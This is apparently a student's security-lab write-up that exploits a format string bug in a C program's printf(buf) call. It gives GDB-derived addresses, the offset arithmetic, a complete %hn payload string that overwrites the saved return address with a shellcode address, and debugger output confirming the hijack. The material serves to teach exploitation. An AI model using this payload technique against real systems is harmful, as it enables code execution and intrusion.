# Question 4: Antares Write-up
## Main Idea
#### (A description of the vulnerability)
The code is vulnerable because no format string is passed into ```printf(buf)``` and we can control ```buf```. We can pass in format string specifiers into ```buf``` where we can read and write from memory and take control of the program. More specifically, we overwrite the rip of ```calibrate``` with the address of our malicious shellcode after which we get the program to do what we want it to do. 
```
    printf(buf);
```
This is a format string vulnerability.

## Magic Numbers
#### (How any relevant “magic numbers” were determined, usually with GDB)
We first determine the address of the shellcode (0xffffd78a). This was done by invoking GDB, setting breakpoint at line 15 and printing out the ```argv[1]```.
```
(gdb) p argv[1]
$22 = 0xffffd78a "j2X̀\211É\301jGX̀1\300Ph//shh/binT[PS\211\341\061Ұ\v̀"
(gdb) x/2wx 0xffffd78a
0xffffd78a:     0xcd58326a      0x89c38980
```
We then find the address of ```buf``` (0xffffd570) and rip of ```calibrate``` (0xffffd55c). This is done running GDB and setting breakpoint at line 8.
```
(gdb) i f
Stack level 0, frame at 0xffffd560:
 eip = 0x8049214 in calibrate (calibrate.c:7); saved eip = 0x804928f
 called by frame at 0xffffd610
 source language c.
 Arglist at 0xffffd558, args: buf=0xffffd570 "AAAA____AAAA____%0u%hn%0u%hn\n"
 Locals at 0xffffd558, Previous frame's sp is 0xffffd560
 Saved registers:
  ebp at 0xffffd558, eip at 0xffffd55c
```
Finally, we calculate the number of words we need to move to point the arg[i] pointer of ```printf``` to start of ```buf```. This was done through taking the difference between the address of start of ```buf``` (0xffffd570) and rip of ```printf``` (0xffffd52c). 0xffffd570 - 0xffffd52c = 44 in hex = 68 in decimal. 68 / 4 = 17 words. Since initially the arg[i] pointer of ```printf``` starts 8 bytes above rip of ```printf``` we subtract 2 words from 17. Thus we need to skip 15 words before the arg[i] pointer reaches start of ```buf```.
```
(gdb) x/16x buf
0xffffd570:     0x41414141      0xffffd55c      0x41414141      0xffffd55e
0xffffd580:     0x63256325      0x63256325      0x63256325      0x63256325
0xffffd590:     0x63256325      0x63256325      0x63256325      0x35256325
0xffffd5a0:     0x37343135      0x6e682575      0x33303125      0x25753735

(gdb) si
printf (
    fmt=0xffffd570 "AAAA\\\325\377\377AAAA^\325\377\377%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%55147u%hn%10357u%hn\n") at src/stdio/printf.c:8
(gdb) i f
Stack level 0, frame at 0xffffd530:
 eip = 0x8049abe in printf (src/stdio/printf.c:8); saved eip = 0x804922f
 called by frame at 0xffffd560
 source language c.
 Arglist at 0xffffd528, args:
    fmt=0xffffd570 "AAAA\\\325\377\377AAAA^\325\377\377%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%55147u%hn%10357u%hn\n"
 Locals at 0xffffd528, Previous frame's sp is 0xffffd530
 Saved registers:
  eip at 0xffffd52c
```

## Exploit Structure
#### (A description of your exploit structure)
We essentially want to overwrite the rip of ```calibrate``` with the address of shellcode. This is done in multiple parts:
1. First, skip past 15 words to point arg[i] pointer of ```printf``` to the start of ```buf``` because that is where we can control the input. 
2. We then print out 0xd78a number of bytes to be able to overwrite the rip of ```calibrate``` with the address of the shellcode. We then write to the memory at 0xffffd55c using %hn.
3. After, we print out remaining bytes to reach 0xffff (0xffff - 0xd78a) because we want to complete the address of shellcode by writing it to the second half of rip of calibrate at 0xffffd55e to complete the overwrite. We wrote to memory using %hn instead of %n because 0xffffd78a = 4294956937 in decimal is a lot of bytes to print out and write to which can cause the program to crash. So we split it in half 0xffff = 65535 and 0xd78a = 55178. 

This causes the ```calibrate``` funciton to start executing the shellcode when it returns. 

## Exploit GDB Output
#### (GDB output demonstrating the before/after of the exploit working)
When we ran GDB after inputting the malicious exploit string, we got the following output:
```
(gdb) i f
Stack level 0, frame at 0xffffd560:
 eip = 0x8049232 in calibrate (calibrate.c:9); saved eip = 0xffffd78a
 called by frame at 0xffffd600
 source language c.
 Arglist at 0xffffd558, args:
    buf=0xffffd570 "AAAA\\\325\377\377AAAA^\325\377\377%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%55147u%hn%10357u%hn\n"
 Locals at 0xffffd558, Previous frame's sp is 0xffffd560
 Saved registers:
  ebp at 0xffffd558, eip at 0xffffd55c
```
The rip of ```calibrate``` at 0xffffd55c is successfully overwritten with the address of shellcode (0xffffd78a). 